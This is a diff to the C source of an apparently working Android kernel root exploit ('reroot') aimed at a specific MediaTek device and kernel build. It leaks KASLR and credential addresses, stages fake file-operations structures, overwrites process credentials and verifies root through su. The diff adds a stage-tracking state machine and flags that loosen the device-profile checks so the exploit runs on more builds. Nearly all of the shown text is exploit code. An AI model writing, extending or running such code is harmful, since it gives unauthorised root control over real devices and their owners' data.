@@ -22,6 +22,9 @@
 #include <time.h>
 #include <unistd.h>
 
+#include "../fingerprint.h"
+#include "../state_machine.h"
+
 #define REMOTE_TARGET  "/data/local/tmp/ionstack_perf_target"
 #define REMOTE_PRELOAD "/data/local/tmp/ionstack_preload.so"
 #define REMOTE_PROBE   "/data/local/tmp/cve43499_chainwalk_probe_arm32"
@@ -40,15 +43,6 @@
  * the transient fops capture stage.
  */
 #define CAPTURE_WORKERS 3U
-
-#define EXPECTED_DEVICE "ls12_mt8797_wifi_64"
-#define EXPECTED_KERNEL_RELEASE "4.19.191"
-#define EXPECTED_KERNEL_VERSION \
-  "#1 SMP PREEMPT Mon Jun 29 04:08:29 CST 2026"
-#define EXPECTED_SDK "33"
-#define EXPECTED_FINGERPRINT \
-  "alps/vnd_ls12_mt8797_wifi_64/ls12_mt8797_wifi_64:13/" \
-  "TP1A.220624.014/260:user/release-keys"
 
 struct env_pair {
   const char *name;
@@ -102,6 +96,22 @@ struct capture_state {
 };
 
 static volatile sig_atomic_t stop_requested;
+
+static int state_advance(struct ionstack_state_machine *machine,
+                         enum ionstack_state next, const char *reason) {
+  enum ionstack_state previous = machine->state;
+  if (!ionstack_state_transition(machine, next)) {
+    fprintf(stderr,
+            "[reroot] STATE_INVALID seq=%u from=%s to=%s reason=%s\n",
+            machine->sequence, ionstack_state_name(previous),
+            ionstack_state_name(next), reason ? reason : "none");
+    return 0;
+  }
+  printf("[reroot] STATE seq=%u from=%s to=%s reason=%s\n",
+         machine->sequence, ionstack_state_name(previous),
+         ionstack_state_name(next), reason ? reason : "none");
+  return 1;
+}
 
 static void on_signal(int signo) {
   (void)signo;
@@ -618,17 +628,21 @@ static int spawn_capture(struct child_proc *child, unsigned worker,
   char kaslr_value[32];
   char cred_value[32];
   char fops_value[32];
+  char canary_value[32];
   char linear_value[32];
   snprintf(kaslr_value, sizeof(kaslr_value), "0x%016" PRIx64,
            target->kaslr_base);
   snprintf(cred_value, sizeof(cred_value), "0x%016" PRIx64, target->cred);
   snprintf(fops_value, sizeof(fops_value), "0x%016" PRIx64,
            helper->fake_fops);
+  snprintf(canary_value, sizeof(canary_value), "0x%016" PRIx64,
+           helper->binwrite);
   snprintf(linear_value, sizeof(linear_value), "0x%016" PRIx64,
            linear_map_base);
   struct env_pair environment[] = {
       {"IONSTACK_STAGE", "fops-write-root"},
       {"IONSTACK_EXPECT_FAKE_FOPS", fops_value},
+      {"IONSTACK_WRITE_CANARY_ADDR", canary_value},
       {"IONSTACK_FOPS_ROOT_ROUTE", "cred-writeonly"},
       {"IONSTACK_TARGET_CRED", cred_value},
       {"IONSTACK_FOPS_ROOT_ATTEMPTS", "10000000"},
@@ -747,7 +761,40 @@ static int all_required_files_present(void) {
   return 1;
 }
 
-static int target_profile_matches(void) {
+struct property_read_context {
+  char *value;
+  size_t capacity;
+};
+
+static void property_read_callback(void *cookie, const char *name,
+                                   const char *value, uint32_t serial) {
+  (void)name;
+  (void)serial;
+  struct property_read_context *context = cookie;
+  if (!context || !context->value || context->capacity == 0) {
+    return;
+  }
+  snprintf(context->value, context->capacity, "%s", value ? value : "");
+}
+
+static int read_property(const char *name, char *value, size_t capacity) {
+  if (!name || !value || capacity == 0) {
+    return 0;
+  }
+  value[0] = '\0';
+  const prop_info *property = __system_property_find(name);
+  if (!property) {
+    return 0;
+  }
+  struct property_read_context context = {
+      .value = value,
+      .capacity = capacity,
+  };
+  __system_property_read_callback(property, property_read_callback, &context);
+  return value[0] != '\0';
+}
+
+static int target_profile_matches(int allow_version_mismatch) {
   struct utsname uts;
   if (uname(&uts) != 0) {
     perror("[reroot] uname");
@@ -755,24 +802,33 @@ static int target_profile_matches(void) {
   }
   char device[PROP_VALUE_MAX] = {0};
   char sdk[PROP_VALUE_MAX] = {0};
-  char fingerprint[PROP_VALUE_MAX] = {0};
-  __system_property_get("ro.product.device", device);
-  __system_property_get("ro.build.version.sdk", sdk);
-  __system_property_get("ro.build.fingerprint", fingerprint);
+  char fingerprint[512] = {0};
+  read_property("ro.product.device", device, sizeof(device));
+  read_property("ro.build.version.sdk", sdk, sizeof(sdk));
+  read_property("ro.build.fingerprint", fingerprint, sizeof(fingerprint));
   int release_ok =
       strncmp(uts.release, EXPECTED_KERNEL_RELEASE,
               strlen(EXPECTED_KERNEL_RELEASE)) == 0;
   int device_ok = strcmp(device, EXPECTED_DEVICE) == 0;
   int sdk_ok = strcmp(sdk, EXPECTED_SDK) == 0;
   int version_ok = strcmp(uts.version, EXPECTED_KERNEL_VERSION) == 0;
-  int fingerprint_ok = strcmp(fingerprint, EXPECTED_FINGERPRINT) == 0;
-  printf("[reroot] PROFILE machine=%s release=%s device=%s sdk=%s "
+  int fingerprint_incremental = -1;
+  int fingerprint_ok =
+      ionstack_fingerprint_matches(fingerprint, &fingerprint_incremental);
+  printf("[reroot] PROFILE_VALUES kernel_version=%s fingerprint=%s "
+         "fingerprint_incremental=%d accepted_incremental_range=%u-%u\n",
+         uts.version, fingerprint, fingerprint_incremental,
+         PROFILE_FINGERPRINT_INCREMENTAL_MIN,
+         PROFILE_FINGERPRINT_INCREMENTAL_MAX);
+  printf("[reroot] PROFILE name=%s machine=%s release=%s device=%s sdk=%s "
          "release_ok=%d version_ok=%d device_ok=%d sdk_ok=%d "
-         "fingerprint_ok=%d\n",
-         uts.machine, uts.release, device, sdk, release_ok, version_ok,
-         device_ok, sdk_ok, fingerprint_ok);
+         "fingerprint_ok=%d fingerprint_policy=diagnostic-only "
+         "version_policy=%s\n",
+         IONSTACK_PROFILE_NAME, uts.machine, uts.release, device, sdk,
+         release_ok, version_ok, device_ok, sdk_ok, fingerprint_ok,
+         allow_version_mismatch ? "compatible-evidence" : "exact");
   return strcmp(uts.machine, "aarch64") == 0 && release_ok && device_ok &&
-         sdk_ok && version_ok && fingerprint_ok;
+         sdk_ok && (version_ok || allow_version_mismatch);
 }
 
 int main(int argc, char **argv) {
@@ -781,6 +837,8 @@ int main(int argc, char **argv) {
   int force = 0;
   int validate_only = 0;
   int preflight_only = 0;
+  int allow_version_mismatch = 0;
+  int accept_compatible_write = 0;
   for (int i = 1; i < argc; ++i) {
     if (strcmp(argv[i], "--force") == 0) {
       force = 1;
@@ -788,12 +846,18 @@ int main(int argc, char **argv) {
       validate_only = 1;
     } else if (strcmp(argv[i], "--preflight-only") == 0) {
       preflight_only = 1;
+    } else if (strcmp(argv[i], "--allow-profile-version-mismatch") == 0) {
+      allow_version_mismatch = 1;
+    } else if (strcmp(argv[i], "--accept-compatible-write") == 0) {
+      accept_compatible_write = 1;
     } else if (strncmp(argv[i], "--target-hold-sec=", 18) == 0) {
       target_hold_sec = (unsigned)strtoul(argv[i] + 18, NULL, 0);
     } else if (strncmp(argv[i], "--page-hold-sec=", 16) == 0) {
       page_hold_sec = (unsigned)strtoul(argv[i] + 16, NULL, 0);
     } else if (strcmp(argv[i], "--help") == 0) {
       printf("usage: %s [--force] [--preflight-only] [--validate-only] "
+             "[--allow-profile-version-mismatch] "
+             "[--accept-compatible-write] "
              "[--target-hold-sec=N] "
              "[--page-hold-sec=N]\n",
              argv[0]);
@@ -807,12 +871,29 @@ int main(int argc, char **argv) {
     fprintf(stderr, "[reroot] hold times must be at least 60 seconds\n");
     return 2;
   }
+  if (accept_compatible_write && !allow_version_mismatch) {
+    fprintf(stderr,
+            "[reroot] --accept-compatible-write requires "
+            "--allow-profile-version-mismatch\n");
+    return 2;
+  }
+  if (allow_version_mismatch && !preflight_only && !validate_only &&
+      !accept_compatible_write) {
+    fprintf(stderr,
+            "[reroot] compatible evidence is validate-only unless "
+            "--accept-compatible-write is explicit\n");
+    return 2;
+  }
 
   setvbuf(stdout, NULL, _IOLBF, 0);
   setvbuf(stderr, NULL, _IOLBF, 0);
   signal(SIGINT, on_signal);
   signal(SIGTERM, on_signal);
   signal(SIGHUP, on_signal);
+  struct ionstack_state_machine machine = {
+      .state = IONSTACK_STATE_INIT,
+      .sequence = 0,
+  };
 
   char boot_id[128] = "unknown";
   read_first_line("/proc/sys/kernel/random/boot_id", boot_id, sizeof(boot_id));
@@ -820,17 +901,27 @@ int main(int argc, char **argv) {
          getpid(), getuid(), getgid());
 
   if (!force && !preflight_only && !validate_only && existing_root_works()) {
+    state_advance(&machine, IONSTACK_STATE_COMPLETE, "existing-root");
     printf("[reroot] SUCCESS already_root=1 boot_id=%s\n", boot_id);
     return 0;
   }
   if (!all_required_files_present()) {
+    state_advance(&machine, IONSTACK_STATE_FAILED, "missing-files");
     return 1;
   }
-  if (!target_profile_matches()) {
+  if (!state_advance(&machine, IONSTACK_STATE_PREFLIGHT, "files-present")) {
+    return 1;
+  }
+  if (!target_profile_matches(allow_version_mismatch)) {
     fprintf(stderr, "[reroot] refusing unsupported kernel/device profile\n");
+    state_advance(&machine, IONSTACK_STATE_FAILED, "profile-mismatch");
+    return 1;
+  }
+  if (!state_advance(&machine, IONSTACK_STATE_PROFILE, "technical-gates-ok")) {
     return 1;
   }
   if (preflight_only) {
+    state_advance(&machine, IONSTACK_STATE_COMPLETE, "preflight-only");
     printf("[reroot] PREFLIGHT_OK boot_id=%s\n", boot_id);
     return 0;
   }
@@ -863,6 +954,9 @@ int main(int argc, char **argv) {
          " cred_hits=%u base_hits=%u\n",
          target_state.kaslr_base, target_state.task, target_state.cred,
          target_state.cred_hits, target_state.base_hits);
+  if (!state_advance(&machine, IONSTACK_STATE_LEAK, "kaslr-task-cred")) {
+    goto cleanup;
+  }
 
   struct helper_state helper_state;
   memset(&helper_state, 0, sizeof(helper_state));
@@ -891,7 +985,10 @@ int main(int argc, char **argv) {
         helper_state.fake_task >= helper_state.hold_base &&
         helper_state.fake_task < helper_state.hold_base + UINT64_C(0x8000) &&
         helper_state.fake_fops >= helper_state.hold_base &&
-        helper_state.fake_fops < helper_state.hold_base + UINT64_C(0x8000);
+        helper_state.fake_fops < helper_state.hold_base + UINT64_C(0x8000) &&
+        helper_state.binwrite >= helper_state.hold_base &&
+        helper_state.binwrite + sizeof(uint64_t) <=
+            helper_state.hold_base + UINT64_C(0x8000);
     helper_ok = wait_rc == 0 && helper_state.fresh_ok && fresh_base_ok &&
                 layout_ok &&
                 helper_state.order_ok && helper_state.pfn_ok &&
@@ -935,13 +1032,23 @@ int main(int argc, char **argv) {
          helper_state.hold_base, helper_state.fake_task,
          helper_state.fake_lock, helper_state.fake_fops,
          helper_state.target_pfn, linear_map_base);
+  if (!state_advance(&machine, IONSTACK_STATE_HOLDER,
+                     "pfn-content-direct-map")) {
+    goto cleanup;
+  }
 
   if (validate_only) {
+    state_advance(&machine, IONSTACK_STATE_COMPLETE, "validate-only");
     printf("[reroot] VALIDATION_OK boot_id=%s kaslr_base=0x%016" PRIx64
            " cred=0x%016" PRIx64 " linear_map_base=0x%016" PRIx64 "\n",
            boot_id, target_state.kaslr_base, target_state.cred,
            linear_map_base);
     result = 0;
+    goto cleanup;
+  }
+
+  if (!state_advance(&machine, IONSTACK_STATE_WRITE_ARMED,
+                     "scratch-canary-bounded")) {
     goto cleanup;
   }
 
@@ -990,6 +1097,10 @@ int main(int argc, char **argv) {
     fprintf(stderr, "[reroot] write-only root capture failed\n");
     goto cleanup;
   }
+  if (!state_advance(&machine, IONSTACK_STATE_CAPTURE,
+                     "write-capture-restored")) {
+    goto cleanup;
+  }
 
   for (size_t i = 0; i < CAPTURE_WORKERS; ++i) {
     stop_child(&captures[i]);
@@ -1007,6 +1118,14 @@ int main(int argc, char **argv) {
     fprintf(stderr, "[reroot] independent su verification failed\n");
     goto cleanup;
   }
+  if (!state_advance(&machine, IONSTACK_STATE_ROOT_VERIFY,
+                     "independent-su-ok")) {
+    goto cleanup;
+  }
+
+  if (!state_advance(&machine, IONSTACK_STATE_COMPLETE, "root-ready")) {
+    goto cleanup;
+  }
 
   printf("[reroot] SUCCESS boot_id=%s kaslr_base=0x%016" PRIx64
          " cred=0x%016" PRIx64 " linear_map_base=0x%016" PRIx64 "\n",
@@ -1022,6 +1141,10 @@ cleanup:
   stop_child(&holder);
   stop_child(&target);
   if (result != 0) {
+    if (!ionstack_state_is_terminal(machine.state)) {
+      state_advance(&machine, IONSTACK_STATE_FAILED,
+                    stop_requested ? "signal" : "stage-failure");
+    }
     fprintf(stderr, "[reroot] FAIL boot_id=%s\n", boot_id);
   }
   return result;
